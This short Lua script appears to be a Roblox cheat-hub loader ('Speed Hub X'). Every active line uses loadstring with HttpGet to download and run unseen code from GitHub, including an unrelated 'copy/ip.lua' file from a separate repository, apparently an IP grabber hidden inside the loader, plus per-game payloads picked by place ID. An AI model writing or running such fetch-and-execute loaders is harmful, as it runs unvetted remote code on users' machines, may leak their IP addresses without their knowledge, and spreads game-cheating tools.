_G.script_executed = "speed-hub.lua"

loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/main/copy/ip.lua'))()

local Games = loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/GameList.lua"))()

for PlaceID, Execute in pairs(Games) do
    if PlaceID == game.PlaceId then
        loadstring(game:HttpGet(Execute))()
    end
end
